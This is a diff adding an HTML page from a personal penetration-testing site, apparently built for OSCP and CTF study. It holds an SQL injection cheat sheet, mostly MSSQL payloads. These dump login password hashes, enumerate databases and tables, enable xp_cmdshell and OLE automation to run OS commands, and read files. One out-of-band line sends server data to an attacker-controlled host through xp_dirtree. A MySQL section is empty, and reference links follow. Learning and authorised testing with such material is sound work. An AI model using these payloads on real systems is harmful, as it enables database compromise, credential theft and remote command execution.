@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+<meta charset="UTF-8">
+<meta name="description" content="">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<!-- The above 4 meta tags *must* come first in the head; any other head content must come *after* these tags -->
+
+<!-- Title -->
+<title>Gandosha - Autodidacticism.</title>
+
+<!-- Core Stylesheet -->
+<link rel="stylesheet" href="style.css">
+
+</head>
+
+<body>
+<!-- Preloader -->
+<div id="preloader">
+<div class="loader"></div>
+</div>
+
+<div class="vcard-main-wrapper">
+<div class="vcard-content-wrapper bg-img" style="background-image: url(img/bg-img/bgssss.jpg);">
+<!-- Header Area -->
+<header class="header_area">
+<!-- Logo -->
+<div class="logo d-flex justify-content-center align-items-center">
+<a href="index-horizontal-about.html"><img src="img/core-img/logo3.png" alt=""></a>
+<!-- Navbar Toggle -->
+<div class="nav-toggle">
+<i class="fa fa-bars"></i>
+</div>
+</div>
+
+<!-- Menu -->
+<ul class="vcard-nav">
+<li><a href="https://github.com/Gandosha" data-toggle="tooltip" data-placement="top" title="Github"><i class="fa fa-fw fa-github" aria-hidden="true"></i></a></li>
+<li><a href="index.html">About</a></li>
+<li><a href="walkthroughs.html">CTF Walkthroughs</a></li>
+<li class="active"><a href="cheatsheets.html">Cheat Sheets</a></li>
+</ul>
+</header>
+
+<!-- Vcard Page Content -->
+<div class="vcard-page-content-wrapper d-flex align-items-end">
+<div class="page-content">
+
+<!-- ##### VM Title and link ##### -->
+<div class="about-me-area section-padding-100 clearfix">
+<div class="container-fluid">
+<div class="row align-items-end">
+<div class="about-me-text">
+<hr>
+<p><h2>SQL Injection Cheat Sheet</h2>
+<hr>
+<br>
+<br>
+<br>
+<br>
+<hr>
+<p><h3>Basics</h3></p>
+<pre style="background-color:black;color:white;">
+#Basic syntax - https://www.w3schools.com/sql/
+#Basic course - https://www.youtube.com/watch?v=BR-VeQUoRCw&list=PLZOToVAK85Mr4CzRimmw4KD84yUjkEAEw
+#Intro
+http://www.anonhack.in/2015/09/sql-injection-part-1/
+
+#Manual method: 
+Use "Fuzz" in zaproxy to do that (1 thread!).
+Use /usr/share/wordlists/wfuzz/stress/alphanum_case_extra.txt. (in Kali)
+
+1) Error Based SQL Injection
+http://www.anonhack.in/2016/01/sql-injection-the-guide/
+http://www.anonhack.in/2017/06/sql-injection-part-3-identifying-string-or-numeric/
+http://www.anonhack.in/2018/04/sql-injection-part-4getting-admin-password/
+
+2) Time Based SQL Injection - Follow the "Show Errors" tab in zaproxy. there will be the correct values (all the "Read timed out" when I used sleep(5)).
+http://www.anonhack.in/2018/07/time-based-blind-sql-injection-on-mysql-how-to-do-manually/
+https://www.ethicalhackx.com/time-based-blind-sql-injection-mysql-manually/
+
+
+3) Boolean Based SQL Injection
+http://www.anonhack.in/2018/07/boolean-based-blind-sql-injection-how-to-do-manually/
+</pre>
+<hr>
+<p><h3>MSSQL</h3></p>
+<pre style="background-color:black;color:white;">
+#Comments
+/*
+--
+;%00
+
+#Version
+SELECT @@version;
+SELECT @@VERSION LIKE '%2008%';
+
+#User details
+SELECT user;
+SELECT current_user;
+SELECT SYSTEM_USER;
+SELECT USER_NAME();
+SELECT USER_NAME(2);
+SELECT SUSER_SNAME();
+SELECT loginame FROM master..sysprocesses WHERE spid=@@SPID;
+SELECT (CASE WHEN (IS_SRVROLEMEMBER('sysadmin')=1) THEN '1' ELSE '0' END);
+
+#Database details
+SELECT DB_NAME();
+SELECT DB_NAME(5);
+SELECT name FROM master..sysdatabases;
+
+#Database credentials
+SELECT name %2b ':'  %2b master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins;
+
+#Server details
+SELECT @@servername; SELECT host_name(); SELECT SERVERPROPERTY('productversion'), SERVERPROPERTY('productlevel');
+
+#Table Names
+SELECT name FROM master..sysobjects WHERE xtype='U';
+SELECT table_name FROM information_schema.tables;
+
+#Columns Names
+SELECT name FROM master..syscolumns WHERE id = (SELECT id FROM master..syscolumns WHERE name = 'tablename';
+SELECT column_name FROM information_schema.columns WHERE table_name = 'tablename';
+
+#No Quotes
+SELECT * FROM Users WHERE username = CHAR(97) + CHAR(98) + CHAR(99);
+ASCII(SUBSTRING(SELECT TOP 1 username FROM Users,1,1)) = 97;
+ASCII(SUBSTRING(SELECT TOP 1 username FROM Users,1,1)) < 128;
+
+#String Concatenation
+SELECT CONCAT('a','a','a');
+SELECT 'a' %2b 'b' %2b 'c' %2b 'd';
+
+#Conditionals
+IF 1=1 SELECT 'true' ELSE SELECT 'false';
+SELECT CASE WHEN 1=1 THEN true ELSE false END;
+
+#Time-delay
+WAITFOR DELAY 'time_to_pass';
+WAITFOR TIME 'time_to_execute';
+
+#Enable Command Execution
+EXEC sp_configure 'show advanced options', 1;
+EXEC sp_configure reconfigure;
+EXEC sp_configure 'xp_cmdshell', 1;
+EXEC sp_configure reconfigure;
+
+#Command Execution
+EXEC master.dbo.xp_cmdshell 'cmd';
+
+#Enable Alternative Command Execution
+EXEC sp_configure 'show advanced options', 1;
+EXEC sp_configure reconfigure;
+EXEC sp_configure 'OLE Automation Procedures', 1;
+EXEC sp_configure reconfigure;
+
+#Alternative Command Execution
+DECLARE @execmd INT;
+EXEC SP_OACREATE 'wscript.shell', @execmd OUTPUT;
+EXEC SP_OAMETHOD @execmd, 'run', null, '%systemroot%system32cmd.exe /c';
+
+#"RunAs"
+SELECT * FROM OPENROWSET('SQLOLEDB', '127.0.0.1';'sa';'password', 'SET FMTONLY OFF execute master..xp_cmdshell "dir"');
+EXECUTE AS USER = 'FooUser';
+
+#List Files
+How to Use xp_dirtree to List All Files in a Folder - http://www.patrickkeisler.com/2012/11/how-to-use-xpdirtree-to-list-all-files.html
+How to Use xp_dirtree to List All Files in a Folder (Part 2) - http://www.patrickkeisler.com/2012/12/how-to-use-xpdirtree-to-list-all-files-part2.html
+
+#Out-of-Band Retrieval
+;declare @q varchar(200);set @q='\attacker.controlledserver'+(SELECT SUBSTRING(@@version,1,9))+'.malicious.com/foo'; exec master.dbo.xp_dirtree @q; --
+
+#Read Files
+BULK INSERT dbo.temp FROM 'c:\foobar.txt' WITH ( ROWTERMINATOR='n' );
+
+#Substrings
+SUBSTRING(table_name,1,1) FROM information_schema.tables = 'A';
+ASCII(SUBSTRING(table_name,1,1)) FROM information_schema.tables > 96;
+
+#Retrieve Nth Line
+SELECT TOP 1 table_name FROM information_schema.tables;
+SELECT TOP 1 table_name FROM information_schema.tables WHERE table_name NOT IN(SELECT TOP 1 table_name FROM information_schema.tables);
+</pre>
+<hr>
+<p><h3>MYSQL</h3></p>
+<pre style="background-color:black;color:white;">
+
+</pre>
+<p><font size="3.5" color="black">Cheat Sheets:</font></p>
+<p><font size="3.5" color="black">* https://websec.ca/kb/sql_injection#MSSQL_Default_Databases</font></p>
+<p><font size="3.5" color="black">* http://www.securityidiots.com/Web-Pentest/SQL-Injection</font></p>
+<p><font size="3.5" color="black">* http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet</font></p>
+<p><font size="3.5" color="black">* https://slack3rsecurity.wordpress.com/2011/11/14/sql-injection-cheatsheet/</font></p>
+<p><font size="3.5" color="black">* https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/</font></p>
+<p><font size="3.5" color="black">* https://github.com/Gandosha/OSCP/blob/master/Documents/SQL%20Injection%20Cheatsheet.md</font></p>
+<br>
+<p><font size="3.5" color="black">Examples:</font></p>
+<p><font size="3.5" color="black">* Boolean Blind SQL Injection - https://0xdf.gitlab.io/2019/01/12/htb-oz.html / https://www.youtube.com/watch?v=4LM_EIehbsU</font></p>
+<p><font size="3.5" color="black">* Time Based SQL Injection - https://www.youtube.com/watch?v=mphLv1ZCMf8 </font></p>
+<p><font size="3.5" color="black">* Error Based + upload shell https://www.youtube.com/watch?v=vPgMi7R9tvs  /  https://www.youtube.com/watch?v=0xrDZi8Qq0A</font></p>
+<p><font size="3.5" color="black">* From MSSQL to RCE - https://www.tarlogic.com/en/blog/red-team-tales-0x01/</font></p>
+<hr>
+
+
+<!-- END OF THE FILE -->
+<hr>
+</div>
+</div>
+
+<div class="about-me-area section-padding-100 clearfix">
+<div class="container-fluid">
+
+
+
+
+
+<!-- ##### All Javascript Files ##### -->
+<!-- jQuery-2.2.4 js -->
+<script src="js/jquery/jquery-2.2.4.min.js"></script>
+<!-- Popper js -->
+<script src="js/bootstrap/popper.min.js"></script>
+<!-- Bootstrap js -->
+<script src="js/bootstrap/bootstrap.min.js"></script>
+<!-- All Plugins js -->
+<script src="js/plugins/plugins.js"></script>
+<!-- Active js -->
+<script src="js/active.js"></script>
+
+</body>
+
+</html>
